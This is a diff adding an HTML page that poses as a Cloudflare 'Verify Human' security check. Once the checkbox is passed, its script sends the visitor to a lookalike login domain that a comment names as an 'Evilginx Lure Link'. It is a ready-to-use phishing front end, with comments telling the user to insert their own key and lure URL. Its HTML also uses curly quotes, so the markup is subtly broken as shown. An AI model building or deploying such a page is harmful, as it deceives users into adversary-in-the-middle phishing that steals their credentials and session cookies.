@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang=“en”>
+<head>
+    <meta charset=“UTF-8”>
+    <meta name=“viewport” content=“width=device-width, initial-scale=1.0”>
+    <title>Security Verification</title>
+    <!— Load Cloudflare Turnstile Script —>
+    <script src=“https://challenges.cloudflare.com/turnstile/v0/api.js” async defer></script>
+    
+    <style>
+        body {
+            font-family: ‘Segoe UI’, Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        /* Makes the checkbox larger and more prominent */
+        .cf-turnstile {
+            transform: scale(1.2);
+            transform-origin: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class=“card”>
+        <h2>Verify Human</h2>
+        <p>Please complete the security check to continue.</p>
+        
+        <!— The Visible Checkbox —>
+        <!— REPLACE THE KEY BELOW WITH YOUR ACTUAL CLOUDFLARE KEY —>
+        <div class=“cf-turnstile” 
+             data-sitekey=“0x4AAAAAAGQ60F12MuReeH5w” 
+             data-callback=“onSuccess”>
+        </div>
+    </div>
+
+    <script>
+        function onSuccess(token) {
+            // Replace this URL with your actual Evilginx Lure Link
+            window.location.href = “https://login.autenticate.online/UfvryfIU”;
+        }
+    </script>
+
+</body>
+</html>
